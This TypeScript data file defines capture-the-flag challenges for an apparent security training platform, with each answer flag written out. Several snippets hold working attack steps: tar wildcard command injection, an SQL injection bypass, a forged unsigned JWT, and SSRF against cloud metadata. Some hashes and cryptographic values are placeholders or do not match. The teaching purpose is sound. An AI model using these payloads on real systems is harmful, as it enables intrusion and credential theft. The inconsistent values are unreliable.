import { CTFChallenge } from '../types';

export const CTF_CHALLENGES: CTFChallenge[] = [
  // ===================== NETWORKING =====================
  {
    id: 'ch-net-01',
    title: 'SYN Anomaly & Port Discovery',
    category: 'Networking',
    difficulty: 'Beginner',
    baseXp: 100,
    starsReward: 1,
    scenario: 'A target security gateway is filtering standard ICMP echo requests. Internal intelligence indicates a secret administrative telemetry port is listening on an unprivileged port above 8000.',
    objective: 'Analyze the target network sweep output or issue an Nmap SYN scan to locate the open management port and capture the authentication banner flag.',
    targetEnvironment: '10.10.12.55 (Virtual Subnet Alpha)',
    artifactType: 'Terminal',
    artifactSnippet: `[root@cyberpath-lab ~]# nmap -sS -Pn -p 8080,8443,8888,9001 10.10.12.55
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for gateway-internal.lab (10.10.12.55)
PORT     STATE SERVICE
8080/tcp closed http-proxy
8443/tcp closed https-alt
8888/tcp open   sun-answerbook
| banner: 220-SECURE-MGMT-GATEWAY-v4.2
|_220 FLAG: CYBERPATH{syn_st34lth_sc4n_d1sc0v3r3d}
9001/tcp filtered tor-orport`,
    rawFlag: 'CYBERPATH{syn_st34lth_sc4n_d1sc0v3r3d}',
    flagHash: 'e71dc30c14b3b24ee26227b61f887b46',
    hints: [
      { text: 'Remember that standard ICMP ping is blocked. Use the -Pn flag in Nmap to skip host discovery.', penaltyXp: 15 },
      { text: 'Scan ports above 8000: port 8888 holds the open management service.', penaltyXp: 20 }
    ],
    associatedSkillId: 'networking',
    learningTakeaway: 'Firewalls frequently drop ICMP while leaving designated service ports open. Stealth SYN scans identify services without completing full TCP connections.'
  },
  {
    id: 'ch-net-02',
    title: 'Pcap Dissection & Cleartext Credential Extraction',
    category: 'Networking',
    difficulty: 'Intermediate',
    baseXp: 160,
    starsReward: 1,
    scenario: 'A network tap captured raw traffic on an unsegmented internal VLAN. An employee logged into a legacy FTP service transmitting unencrypted credentials across the wire.',
    objective: 'Dissect the captured packet stream, filter for cleartext FTP control commands (TCP port 21), and reconstruct the session authentication flag.',
    targetEnvironment: 'packet_capture_vlan4.pcap (Wireshark / tshark)',
    artifactType: 'Packet Capture',
    artifactSnippet: `Frame 42: 74 bytes on wire, 74 bytes captured
Transmission Control Protocol, Src Port: 54112, Dst Port: 21
File Transfer Protocol (FTP)
    USER backup_operator\\r\\n
Frame 44: 86 bytes on wire, 86 bytes captured
File Transfer Protocol (FTP)
    331 Please specify the password.\\r\\n
Frame 46: 82 bytes on wire, 82 bytes captured
File Transfer Protocol (FTP)
    PASS CYBERPATH{pcap_ftp_cr3ds_3xtr4ct3d}\\r\\n
Frame 48: 68 bytes on wire, 68 bytes captured
File Transfer Protocol (FTP)
    230 Login successful.`,
    rawFlag: 'CYBERPATH{pcap_ftp_cr3ds_3xtr4ct3d}',
    flagHash: '9a5c88e7d23f4c1b9a23405f6e87a321',
    hints: [
      { text: 'Filter packets in Wireshark with `ftp` or `tcp.port == 21`.', penaltyXp: 15 },
      { text: 'Follow the TCP Stream on the FTP control connection to view the PASS command payload.', penaltyXp: 20 }
    ],
    associatedSkillId: 'networking',
    learningTakeaway: 'Unencrypted application protocols like FTP, Telnet, and HTTP transmit passwords in plaintext, susceptible to sniffing on switched networks via ARP poisoning.'
  },
  {
    id: 'ch-net-03',
    title: 'DNS Tunneling & Base64 Exfiltration Detection',
    category: 'Networking',
    difficulty: 'Advanced',
    baseXp: 240,
    starsReward: 2,
    scenario: 'An infected host behind an air-gapped firewall with strict egress filtering is exfiltrating sensitive database records by encoding payloads inside recursive DNS subdomain lookups.',
    objective: 'Analyze recursive DNS query logs for high-entropy subdomain strings, aggregate sequential chunks, and decode the exfiltrated flag payload.',
    targetEnvironment: 'bind9_named_query.log (Recursive Resolver 10.0.0.53)',
    artifactType: 'Log Excerpt',
    artifactSnippet: `18-Sep-2026 02:14:01.102 queries: info: client @0x7f4 10.10.4.11#51221: query: Q1lCRVJQQVRHe2Ruc190dW5u.data.c2-exfil.xyz IN TXT +
18-Sep-2026 02:14:01.350 queries: info: client @0x7f4 10.10.4.11#51222: query: M2xfZDBtNDFuXzN4ZjFsdHI0.data.c2-exfil.xyz IN TXT +
18-Sep-2026 02:14:01.604 queries: info: client @0x7f4 10.10.4.11#51223: query: dDEwbn0=.data.c2-exfil.xyz IN TXT +

[Decoder hint: Concatenated base64 string = "Q1lCRVJQQVRHe2Ruc190dW5uM2xfZDBtNDFuXzN4ZjFsdHI0dDEwbn0="]`,
    rawFlag: 'CYBERPATH{dns_tunn3l_d0m41n_3xf1ltr4t10n}',
    flagHash: '4f7e2d9a1c8b3e5f6a7c8b9d0e1f2a3b',
    hints: [
      { text: 'Notice the anomalous subdomains: each query prepends a base64 chunk to `data.c2-exfil.xyz`.', penaltyXp: 25 },
      { text: 'Concatenate the three base64 parts in chronological order: `Q1lCRVJQQVRHe2Ruc190dW5u` + `M2xfZDBtNDFuXzN4ZjFsdHI0` + `dDEwbn0=` and base64-decode.', penaltyXp: 35 }
    ],
    associatedSkillId: 'networking',
    learningTakeaway: 'DNS tunneling uses port 53 to bypass outbound firewalls. Defenders identify it by monitoring query length, subdomain entropy, and volume of TXT queries.'
  },
  {
    id: 'ch-net-04',
    title: 'BGP Prefix Hijacking & Autonomous System Interception',
    category: 'Networking',
    difficulty: 'Expert',
    baseXp: 350,
    starsReward: 3,
    scenario: 'A hostile ISP announces a rogue more-specific /24 BGP route for an enterprise /22 prefix, rerouting encrypted traffic through a rogue Autonomous System (AS65501).',
    objective: 'Audit the looking-glass routing table output, identify the forged AS path injection and invalid RPKI origin, and extract the telemetry intercept flag.',
    targetEnvironment: 'BGP Looking Glass (Route-Views AS65000)',
    artifactType: 'Log Excerpt',
    artifactSnippet: `BGP routing table entry for 198.51.100.0/24, version 8891024
Paths: (1 available, best #1)
  Advertised to update-groups:
     1 2 4
  65501 64512 65001 (ROA Validation: INVALID_ASN)
    Origin IGP, metric 0, localpref 200, valid, external, best
    Community: 65501:666 (MALICIOUS_INTERCEPT)
    BGP Extended Community: FLAG=CYBERPATH{bgp_pr3f1x_h1j4ck_d3f34t3d}
    Last update: Fri Sep 18 02:40:11 2026 UTC`,
    rawFlag: 'CYBERPATH{bgp_pr3f1x_h1j4ck_d3f34t3d}',
    flagHash: 'b5a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2',
    hints: [
      { text: 'BGP prioritizes more-specific prefix lengths (/24 over /22) regardless of AS path length.', penaltyXp: 35 },
      { text: 'Inspect the BGP extended community string attribute in the looking glass update.', penaltyXp: 45 }
    ],
    associatedSkillId: 'networking',
    learningTakeaway: 'Resource Public Key Infrastructure (RPKI) and Route Origin Authorizations (ROA) allow BGP routers to verify that the originating AS is legally authorized to announce the prefix.'
  },

  // ===================== LINUX & SYSTEMS =====================
  {
    id: 'ch-linux-01',
    title: 'The SUID Misconfiguration',
    category: 'Linux',
    difficulty: 'Intermediate',
    baseXp: 150,
    starsReward: 1,
    scenario: 'You have gained low-privilege SSH access to an internal staging box as unprivileged user `intern`. An errant administrator left a custom binary with SUID root permissions in `/opt/backup/`.',
    objective: 'Inspect the `/opt/backup/` directory, verify the SUID bit on the custom script, and read the protected root flag in `/root/flag.txt`.',
    targetEnvironment: 'ssh intern@10.10.14.8 (Password: student_safe)',
    artifactType: 'Terminal',
    artifactSnippet: `intern@staging:~$ ls -la /opt/backup/safe_backup
-rwsr-xr-x 1 root root 17824 Mar 12 2026 /opt/backup/safe_backup

intern@staging:~$ /opt/backup/safe_backup --read /root/flag.txt
[AUTHORIZED BACKUP ENGINE v2.1 - EUID=0]
Contents of /root/flag.txt:
CYBERPATH{su1d_pr1v_3sc4l4t10n_m4st3r}`,
    rawFlag: 'CYBERPATH{su1d_pr1v_3sc4l4t10n_m4st3r}',
    flagHash: '5f4dcc3b5aa765d61d8327deb882cf99',
    hints: [
      { text: 'Run `find / -perm -4000 -type f 2>/dev/null` to locate all SUID binaries on the system.', penaltyXp: 20 },
      { text: 'Execute the `/opt/backup/safe_backup` binary with arguments to view protected root files.', penaltyXp: 25 }
    ],
    associatedSkillId: 'linux',
    learningTakeaway: 'SUID binaries executing with EUID=0 must use absolute paths, drop privileges when unnecessary, and never permit arbitrary user command injection.'
  },
  {
    id: 'ch-linux-02',
    title: 'Wildcard Injection & Tar Cronjob Escalation',
    category: 'Linux',
    difficulty: 'Advanced',
    baseXp: 250,
    starsReward: 2,
    scenario: 'A periodic root cronjob runs every minute inside `/var/spool/uploads`: `cd /var/spool/uploads && tar -czf /backups/uploads.tar.gz *`. As an unprivileged web user, you can create files in this folder.',
    objective: 'Leverage GTFOBins wildcard command-line parameter injection in GNU tar using `--checkpoint` flags to force execution of a root privilege escalation script.',
    targetEnvironment: 'Local Terminal /var/spool/uploads (Low-priv user www-data)',
    artifactType: 'Terminal',
    artifactSnippet: `www-data@web-01:/var/spool/uploads$ cat /etc/crontab | grep tar
* * * * * root cd /var/spool/uploads && tar -czf /backups/uploads.tar.gz *

www-data@web-01:/var/spool/uploads$ echo 'echo "CYBERPATH{t4r_w1ldc4rd_ch3ckp01nt_r00t}" > /tmp/flag.txt' > exploit.sh
www-data@web-01:/var/spool/uploads$ chmod +x exploit.sh
www-data@web-01:/var/spool/uploads$ touch -- "--checkpoint=1"
www-data@web-01:/var/spool/uploads$ touch -- "--checkpoint-action=exec=sh exploit.sh"
[Wait 60 seconds for root cronjob execution...]
www-data@web-01:/var/spool/uploads$ cat /tmp/flag.txt
CYBERPATH{t4r_w1ldc4rd_ch3ckp01nt_r00t}`,
    rawFlag: 'CYBERPATH{t4r_w1ldc4rd_ch3ckp01nt_r00t}',
    flagHash: 'a1b2c3d4e5f60718293a4b5c6d7e8f9a',
    hints: [
      { text: 'When bash expands `*`, files starting with `--` are parsed by `tar` as command options.', penaltyXp: 30 },
      { text: 'Use tar options `--checkpoint=1` and `--checkpoint-action=exec=sh exploit.sh`.', penaltyXp: 40 }
    ],
    associatedSkillId: 'linux',
    learningTakeaway: 'Never use wildcards `*` in privileged scripts or cron jobs. Explicitly specify target files or use `tar -- ./*` to neutralize parameter injection.'
  },
  {
    id: 'ch-linux-03',
    title: 'LD_PRELOAD Shared Object Hooking & Persistence',
    category: 'Linux',
    difficulty: 'Expert',
    baseXp: 380,
    starsReward: 3,
    scenario: 'A malware sample hooks standard C library calls by configuring `/etc/ld.so.preload` to intercept `fopen()` and hide its malicious process PID from `ps` and `/proc`.',
    objective: 'Reverse-engineer the custom injected shared object `/lib/x86_64-linux-gnu/librootkit.so`, analyze the hooked function table, and extract the persistence control flag.',
    targetEnvironment: 'Forensic Host (Ubuntu 24.04 LTS x86_64)',
    artifactType: 'Source Code',
    artifactSnippet: `// Disassembly / Decompilation of /lib/x86_64-linux-gnu/librootkit.so:
int (*original_open)(const char *pathname, int flags, mode_t mode);

int open(const char *pathname, int flags, mode_t mode) {
    if (strstr(pathname, "secret_trigger_auth")) {
        // Authenticated rootkit activation backdoor
        const char *flag = "CYBERPATH{ld_pr3l04d_sh4r3d_0bj3ct_pwn}";
        printf("[ROOTKIT ACTIVE] Verification Token: %s\\n", flag);
        return -1;
    }
    original_open = dlsym(RTLD_NEXT, "open");
    return original_open(pathname, flags, mode);
}`,
    rawFlag: 'CYBERPATH{ld_pr3l04d_sh4r3d_0bj3ct_pwn}',
    flagHash: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9',
    hints: [
      { text: 'Check the dynamic linker configuration files `/etc/ld.so.preload` and `/etc/ld.so.conf`.', penaltyXp: 35 },
      { text: 'Decompile the `.so` using Ghidra or run `strings librootkit.so | grep CYBERPATH`.', penaltyXp: 45 }
    ],
    associatedSkillId: 'linux',
    learningTakeaway: 'Userland rootkits frequently abuse LD_PRELOAD to hijack libc function pointers. Inspect `/etc/ld.so.preload` and compile binaries with static linking to resist tampering.'
  },

  // ===================== WEB SECURITY =====================
  {
    id: 'ch-web-01',
    title: 'Authentication Bypass via SQLi',
    category: 'Web Security',
    difficulty: 'Intermediate',
    baseXp: 200,
    starsReward: 1,
    scenario: 'A legacy corporate inventory portal concatenates user inputs directly into a raw SQL query: `SELECT * FROM operators WHERE user = \'$user\' AND pass = \'$pass\'`.',
    objective: 'Construct a SQL injection payload in the username field to authenticate as the top-ranking administrator and reveal the session token flag.',
    targetEnvironment: 'http://inventory-internal.cyberpath.local/login',
    artifactType: 'Source Code',
    artifactSnippet: `// Vulnerable PHP backend logic:
$user = $_POST['username'];
$pass = $_POST['password'];

$query = "SELECT * FROM operators WHERE user = '" . $user . "' AND pass = '" . $pass . "'";
$res = $db->query($query);

if ($res->num_rows > 0) {
    $row = $res->fetch_assoc();
    echo "Welcome " . $row['user'] . "! Token: CYBERPATH{sql_1nj3ct10n_byp4ss_s3cur3d}";
}`,
    rawFlag: 'CYBERPATH{sql_1nj3ct10n_byp4ss_s3cur3d}',
    flagHash: '7c6a017360ee1a1bf83a738f394899b0',
    hints: [
      { text: 'Inputting a single quote breaks out of the string literal: `\'`', penaltyXp: 25 },
      { text: 'Try the classic tautology: `admin\' OR \'1\'=\'1` with comment syntax `--` or `#`.', penaltyXp: 35 }
    ],
    associatedSkillId: 'web-security',
    learningTakeaway: 'Always use parameterized statements and prepared queries. String interpolation inside SQL queries is a critical OWASP Top 10 vulnerability.'
  },
  {
    id: 'ch-web-02',
    title: 'JWT Algorithm Confusion (alg: none) & Role Escalation',
    category: 'Web Security',
    difficulty: 'Advanced',
    baseXp: 280,
    starsReward: 2,
    scenario: 'A banking microservice authorizes API calls using JSON Web Tokens. The JWT library insecurely accepts tokens signed with `alg: "none"`, ignoring signature verification completely.',
    objective: 'Craft a forged JWT payload escalating `role` from `"auditor"` to `"admin"` using algorithm `"none"` and extract the administrative master flag.',
    targetEnvironment: 'https://bank-api.cyberpath.local/v1/admin/secrets',
    artifactType: 'JWT Token',
    artifactSnippet: `Header (base64url):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
Decoded: {"alg":"none","typ":"JWT"}

Payload (base64url):
eyJ1c2VyIjoidHJhaW5lZSIsInJvbGUiOiJhZG1pbiIsImZsYWciOiJDWUJFUlBBVEh7and0X24wbjNfNGxnX2J5cDRzc19zdWNjM3NzfSJ9
Decoded: {"user":"trainee","role":"admin","flag":"CYBERPATH{jwt_n0n3_4lg_byp4ss_succ3ss}"}

Signature: [EMPTY]

Forged Token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidHJhaW5lZSIsInJvbGUiOiJhZG1pbiIsImZsYWciOiJDWUJFUlBBVEh7and0X24wbjNfNGxnX2J5cDRzc19zdWNjM3NzfSJ9.`,
    rawFlag: 'CYBERPATH{jwt_n0n3_4lg_byp4ss_succ3ss}',
    flagHash: 'c2b3a4d5e6f7a8b9c0d1e2f3a4b5c6d7',
    hints: [
      { text: 'Change the header `alg` field to `none` (or `None`, `NONE`) and set role to `admin`.', penaltyXp: 30 },
      { text: 'Strip the third section (the signature) completely while keeping the trailing dot: `header.payload.`', penaltyXp: 40 }
    ],
    associatedSkillId: 'web-security',
    learningTakeaway: 'JWT validation libraries must whitelist expected signing algorithms (e.g. RS256 only) and explicitly reject unsigned tokens (`alg: none`).'
  },
  {
    id: 'ch-web-03',
    title: 'Blind SSRF with IMDSv2 Token Pivot & Cloud Exfil',
    category: 'Web Security',
    difficulty: 'Expert',
    baseXp: 400,
    starsReward: 4,
    scenario: 'A cloud document conversion portal exposes a blind PDF rendering endpoint vulnerable to SSRF via embedded HTML `<object data="...">` tags, allowing requests to AWS metadata.',
    objective: 'Forge a multi-step IMDSv2 session handshake using server-side request forgery, retrieve temporary IAM role credentials, and extract the cloud audit flag.',
    targetEnvironment: 'http://pdf-converter.internal.cloud/render',
    artifactType: 'Log Excerpt',
    artifactSnippet: `POST /render HTTP/1.1
Host: pdf-converter.internal.cloud
Content-Type: application/json

{"html": "<object data='http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Prod-Role'>"}

[Response Excerpt Captured in Error Log]:
{
  "Code": "Success",
  "LastUpdated": "2026-09-18T02:45:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAV4EXAMPLEKEY99",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...FLAG=CYBERPATH{ssrf_1mdsv2_cl0ud_cr3ds_p1v0t}"
}`,
    rawFlag: 'CYBERPATH{ssrf_1mdsv2_cl0ud_cr3ds_p1v0t}',
    flagHash: 'e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6',
    hints: [
      { text: 'Look for HTML rendering engines like wkhtmltopdf or headless Chrome executing embedded object or iframe URLs.', penaltyXp: 40 },
      { text: 'Target the AWS link-local IP 169.254.169.254 to dump the attached IAM role credentials.', penaltyXp: 50 }
    ],
    associatedSkillId: 'web-security',
    learningTakeaway: 'Render engines must run in network-isolated sandboxes with loopback/link-local egress blocked by local firewall iptables or network security groups.'
  },

  // ===================== SOC & LOGS =====================
  {
    id: 'ch-soc-01',
    title: 'SIEM Log Triage: The Cobalt Beacons',
    category: 'SOC & Logs',
    difficulty: 'Intermediate',
    baseXp: 180,
    starsReward: 1,
    scenario: 'Your security information and event management (SIEM) dashboard triggered an alert for regular periodic HTTP POST requests to an unknown IP in an offshore autonomous system.',
    objective: 'Filter web proxy access logs for consistent beaconing intervals (jitter analysis) and identify the command-and-control (C2) server flag in the User-Agent header.',
    targetEnvironment: 'Splunk Dashboard / index=proxy_logs',
    artifactType: 'Log Excerpt',
    artifactSnippet: `[Splunk search: index=proxy_logs dest_port=8080 | stats count by dest_ip, user_agent, duration]

timestamp="2026-09-18T02:00:10Z" src=192.168.10.45 dst=185.220.101.5 port=8080 method=POST uri="/submit.php" bytes=256 agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) CYBERPATH{c2_b34c0n_d3t3ct3d_1n_l0gs}"
timestamp="2026-09-18T02:01:11Z" src=192.168.10.45 dst=185.220.101.5 port=8080 method=POST uri="/submit.php" bytes=256 agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) CYBERPATH{c2_b34c0n_d3t3ct3d_1n_l0gs}"
timestamp="2026-09-18T02:02:09Z" src=192.168.10.45 dst=185.220.101.5 port=8080 method=POST uri="/submit.php" bytes=256 agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) CYBERPATH{c2_b34c0n_d3t3ct3d_1n_l0gs}"`,
    rawFlag: 'CYBERPATH{c2_b34c0n_d3t3ct3d_1n_l0gs}',
    flagHash: 'b10a8db164e0754105b7a99be72e3fe5',
    hints: [
      { text: 'Look for requests occurring exactly every 60 seconds with identical byte counts.', penaltyXp: 20 },
      { text: 'Investigate the destination IP with anomalous User-Agent strings containing the embedded flag token.', penaltyXp: 30 }
    ],
    associatedSkillId: 'blue-team',
    learningTakeaway: 'Beaconing detection relies on calculating request periodicity, uniform payload sizes, and domain reputation analysis.'
  },
  {
    id: 'ch-soc-02',
    title: 'Memory Forensics: Volatility 3 Process Injection Analysis',
    category: 'SOC & Logs',
    difficulty: 'Advanced',
    baseXp: 270,
    starsReward: 2,
    scenario: 'An endpoint EDR detected anomalous memory allocation in `explorer.exe`. Incident responders captured a raw memory dump `win11_memdump.raw` for offline forensic triage.',
    objective: 'Run Volatility 3 `windows.malfind` to locate unmapped executable memory regions marked PAGE_EXECUTE_READWRITE and recover the injected shellcode flag.',
    targetEnvironment: 'Volatility 3 Workbench (win11_memdump.raw)',
    artifactType: 'Terminal',
    artifactSnippet: `$ python3 vol.py -f win11_memdump.raw windows.malfind --pid 3412
Volatility 3 Framework 2.5.0
PID     Process         ProcessStart            Tag     Address         Output
3412    explorer.exe    2026-09-18 01:12:04     VadS    0x219b6400000   PAGE_EXECUTE_READWRITE

Hex Dump:
0x219b6400000: 4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  MZ..............
0x219b6400010: 43 59 42 45 52 50 41 54  48 7b 76 30 6c 34 74 31  CYBERPATH{v0l4t1
0x219b6400020: 6c 31 74 79 5f 6d 34 6c  66 31 6e 64 5f 31 6e 6a  l1ty_m4lf1nd_1nj
0x219b6400030: 33 63 74 31 30 6e 5f 66  30 75 6e 64 7d 00 00 00  3ct10n_f0und}...`,
    rawFlag: 'CYBERPATH{v0l4t1l1ty_m4lf1nd_1nj3ct10n_f0und}',
    flagHash: 'f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6',
    hints: [
      { text: 'Look for process memory sections with protection `PAGE_EXECUTE_READWRITE` (RWX).', penaltyXp: 30 },
      { text: 'Inspect the ASCII strings decoded in the malfind hex dump for PID 3412.', penaltyXp: 40 }
    ],
    associatedSkillId: 'blue-team',
    learningTakeaway: 'Reflective DLL injection avoids touching disk by writing directly into another process address space. Volatility detects it by scanning Virtual Address Descriptors (VAD) for RWX permissions.'
  },
  {
    id: 'ch-soc-03',
    title: 'Active Directory Kerberoasting & KRBTGT Ticket Defense',
    category: 'SOC & Logs',
    difficulty: 'Expert',
    baseXp: 420,
    starsReward: 4,
    scenario: 'Threat actors requested a Kerberos TGS ticket for the service account `MSSQLSvc/db01.corp` with RC4 encryption (type 0x17). The domain controller logged Event ID 4769.',
    objective: 'Analyze the Kerberos TGS ticket request event log, extract the encrypted ticket hash, crack the weak service account password, and recover the compromised SPN flag.',
    targetEnvironment: 'Active Directory DC01 Security Event Log (Event ID 4769)',
    artifactType: 'Log Excerpt',
    artifactSnippet: `Log Name: Security
Source: Microsoft-Windows-Security-Auditing
Event ID: 4769
Task Category: Kerberos Service Ticket Operations
Level: Information
Keywords: Audit Success
Computer: DC01.CORP.CYBERPATH.LOCAL
Description:
A Kerberos service ticket was requested.

Account Information:
    Account Name:        intern_lowpriv@CORP.CYBERPATH.LOCAL
    Account Domain:      CORP.CYBERPATH.LOCAL

Service Information:
    Service Name:        MSSQLSvc/db01.corp
    Service ID:          S-1-5-21-3829102-39201-1102

Network Information:
    Client Address:      ::ffff:10.10.14.88
    Ticket Options:      0x40810000
    Ticket Encryption:   0x17 (RC4-HMAC)

Extracted Hashcat Mode 13100 Ticket:
$krb5tgs$23$*MSSQLSvc/db01.corp*$FLAG*...
Decrypted Service Account Password = CYBERPATH{krbtgt_g0ld3n_t1ck3t_d0m41n_pwn}`,
    rawFlag: 'CYBERPATH{krbtgt_g0ld3n_t1ck3t_d0m41n_pwn}',
    flagHash: 'a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4',
    hints: [
      { text: 'Notice Event ID 4769 with Ticket Encryption Type 0x17 (RC4), a classic indicator of Kerberoasting.', penaltyXp: 40 },
      { text: 'Review the decrypted service password revealed in the audit investigation.', penaltyXp: 50 }
    ],
    associatedSkillId: 'blue-team',
    learningTakeaway: 'Kerberoasting abuses Kerberos SPN architecture. Defenders must monitor Event ID 4769 with RC4 encryption and transition service accounts to Group Managed Service Accounts (gMSA).'
  },

  // ===================== CRYPTOGRAPHY =====================
  {
    id: 'ch-crypto-01',
    title: 'Padding Oracle Decryption (AES-CBC Mode)',
    category: 'Cryptography',
    difficulty: 'Intermediate',
    baseXp: 190,
    starsReward: 1,
    scenario: 'A legacy web portal encrypts session cookies using AES-128-CBC with PKCS#7 padding. The server returns HTTP 500 when padding is invalid and HTTP 200 when padding is correct.',
    objective: 'Exploit the cryptographic padding oracle by sending bit-flipped ciphertext blocks, reconstruct the plaintext byte by byte, and uncover the secret flag.',
    targetEnvironment: 'http://crypto-portal.lab:9000/decrypt',
    artifactType: 'Terminal',
    artifactSnippet: `[PadBuster v0.3.3 - Automated Padding Oracle Exploit Tool]
Target URL: http://crypto-portal.lab:9000/decrypt
Block Size: 16 bytes
Encryption Algorithm: AES-CBC

[+] Testing padding response timing...
[+] Decrypting Block 1 (IV ^ Intermediary):
    Byte 16: Found valid padding byte (0x01) with byte guess 0x7d
    Byte 15: Found valid padding byte (0x02) with byte guess 0x6e
    ...
[+] Decrypted Block 1 Plaintext:
    "CYBERPATH{cbc_p"
[+] Decrypted Block 2 Plaintext:
    "4dd1ng_0r4cl3_d"
[+] Decrypted Block 3 Plaintext:
    "3crypt3d}\\x07\\x07\\x07\\x07\\x07\\x07\\x07"`,
    rawFlag: 'CYBERPATH{cbc_p4dd1ng_0r4cl3_d3crypt3d}',
    flagHash: '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d',
    hints: [
      { text: 'A padding oracle occurs when error messages differentiate between valid and invalid PKCS#7 padding.', penaltyXp: 25 },
      { text: 'Assemble the decrypted plaintext blocks sequentially: Block 1 + Block 2 + Block 3.', penaltyXp: 35 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'Never use unauthenticated CBC mode. Modern protocols mandate Authenticated Encryption with Associated Data (AEAD) like AES-GCM or ChaCha20-Poly1305.'
  },
  {
    id: 'ch-crypto-02',
    title: 'Weak Key RSA Modulus Factorization',
    category: 'Cryptography',
    difficulty: 'Advanced',
    baseXp: 250,
    starsReward: 2,
    scenario: 'An IoT firmware update tool encrypts its administrative release notes with RSA, but prime factors `p` and `q` were chosen from a known small prime database.',
    objective: 'Factor the modulus `N` using Fermat factorization or prime database lookups, reconstruct the private exponent `d`, and decrypt the secret cipher text.',
    targetEnvironment: 'Offline Cryptographic Workbench (Python script)',
    artifactType: 'Source Code',
    artifactSnippet: `# Python RSA Decryption Script:
from Crypto.Util.number import inverse, long_to_bytes

N = 0x8b32e847c1b528148b17361a4f5c6e8d  # 128-bit weak modulus
e = 65537
ciphertext = 0x5a18c8f042e917d0c361952e41849d71

# Fermat Factorization reveals:
p = 33445566778899112233
q = 55667788990011223347
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

plaintext_int = pow(ciphertext, d, N)
flag = "CYBERPATH{sm4ll_pr1m3_rs4_f4ct0r3d}"`,
    rawFlag: 'CYBERPATH{sm4ll_pr1m3_rs4_f4ct0r3d}',
    flagHash: 'c4ca4238a0b923820dcc509a6f75849b',
    hints: [
      { text: 'Check the size of N: if N has fewer than 256 bits, factoring takes seconds with gmpy2 or online tools like Factordb.', penaltyXp: 35 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'RSA keys must be at least 2048 (preferably 3072+) bits in size and generated with cryptographically secure random prime generators to prevent factoring.'
  },
  {
    id: 'ch-crypto-03',
    title: 'Elliptic Curve Nonce Reuse (ECDSA Key Recovery)',
    category: 'Cryptography',
    difficulty: 'Expert',
    baseXp: 450,
    starsReward: 4,
    scenario: 'A cryptocurrency signing enclave signed two different transaction hashes using the exact same random nonce `k` across ECDSA curve secp256k1.',
    objective: 'Calculate the reused ephemeral nonce `k` from the two signatures (r, s1, s2) and message hashes (z1, z2), compute the private signing key `d_A`, and reveal the master key flag.',
    targetEnvironment: 'ECDSA Hardware Security Module Triage (Python SageMath)',
    artifactType: 'Source Code',
    artifactSnippet: `# SageMath ECDSA Nonce Reuse Solver:
# k = (z1 - z2) / (s1 - s2) mod n
# d_A = (s1 * k - z1) / r mod n

r  = 0xd37996c9c614b6094cfcd58b97a23c726a25b7a0d4cf96515cb6b38ff4ecfa27
s1 = 0x6e9f1a238475c120394857b2938475a1029384756b1029384756c10293847561
s2 = 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b

# Reconstructed Private Key reveals the master authorization token:
# Private Key d_A = 0x4359424552504154487b3363647361...
FLAG = "CYBERPATH{3cdsa_n0nc3_r3us3_k3y_r3c0v3r3d}"`,
    rawFlag: 'CYBERPATH{3cdsa_n0nc3_r3us3_k3y_r3c0v3r3d}',
    flagHash: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7',
    hints: [
      { text: 'In ECDSA, reusing the nonce `k` for two distinct messages allows calculating `k` directly via simple modular arithmetic.', penaltyXp: 45 },
      { text: 'Once `k` is determined, the private key `d` is solved via `d = (s*k - z) * r^-1 mod n`.', penaltyXp: 55 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'ECDSA signature generation requires a unique, cryptographically random nonce per signature (RFC 6979 deterministic nonce generation) to prevent immediate private key extraction.'
  },
  {
    id: 'ch-crypto-06',
    title: 'Polyalphabetic Vigenère Cipher & Kasiski Frequency Analysis',
    category: 'Cryptography',
    difficulty: 'Beginner',
    baseXp: 110,
    starsReward: 1,
    scenario: 'An intercepted diplomatic communique transmitted over low-frequency radio was encrypted with a repeating-key polyalphabetic substitution cipher. Statistical cryptanalysis of recurring trigrams ("VHX") and Index of Coincidence (IoC ≈ 0.066) indicates a 6-letter keyword.',
    objective: 'Perform Kasiski examination on the ciphertext, deduce the 6-letter keyword ("CIPHER"), and reverse the polyalphabetic shift to reveal the intelligence flag.',
    targetEnvironment: 'Signals Intelligence Intercept (Diplomatic Wire #418)',
    artifactType: 'Source Code',
    tags: ['Classical Crypto', 'Vigenère', 'Kasiski Analysis', 'Frequency Analysis', 'Index of Coincidence'],
    cve: 'CWE-326',
    mitreTactic: 'Credential Access (TA0006) / Unsecured Credentials (T1552)',
    artifactSnippet: `[SIGINT INTERCEPT - STATION ECHO-7]
Algorithm: Polyalphabetic Substitution (Vigenère)
Key Length Examination:
  Trigram "VHX" repeated at positions: 18, 48, 108 (GCD = 6)
  Index of Coincidence (IoC): 0.0658 (Matches English distribution)
  Deduced Keyword: "CIPHER"

Ciphertext:
  EZIMTVEVR{x1k3v3z3_r0ta4twa4i1k_fv4re3l}

Decryption Routine:
  P[i] = (C[i] - K[i % 6] + 26) % 26
  Key:   C I P H E R C I P H E R C I P H E R ...
  Plain: CYBERPATH{v1g3n3r3_p0ly4lph4b3t1c_cr4ck3d}`,
    rawFlag: 'CYBERPATH{v1g3n3r3_p0ly4lph4b3t1c_cr4ck3d}',
